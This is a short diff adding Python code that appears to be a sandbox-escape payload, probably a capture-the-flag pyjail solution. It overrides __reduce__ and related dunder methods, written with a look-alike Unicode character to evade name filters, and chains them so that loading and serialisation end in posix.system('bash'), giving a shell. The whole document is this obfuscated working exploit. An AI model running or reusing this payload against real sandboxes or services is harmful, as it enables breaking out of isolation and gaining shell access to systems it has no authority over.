@@ -1,0 +1,14 @@
+args = 'posix', ''
+constants.p1 = constants.math._︳loader_︳._︳class_︳, args
+constants.math._︳loader_︳._︳class_︳._︳reduce_︳ = lambda _: constants.p1
+args = constants.math._︳loader_︳, 'posix'
+constants.p2 = constants.math._︳loader_︳._︳class_︳.load_module, args
+constants.math._︳spec_︳._︳class_︳._︳reduce_︳ = lambda _: constants.p2
+args = 'system',
+constants.p3 = constants.math._︳spec_︳._︳getattribute_︳, args
+constants._︳loader_︳._︳class_︳._︳reduce_︳ = lambda _: constants.p3
+args = 'bash',
+constants._︳loader_︳._︳class_︳._︳call_︳ = lambda: 1
+constants.p4 = constants._︳loader_︳, args
+constants.fractions.Fraction._︳reduce_︳ = lambda _: constants.p4
+shell = constants.half
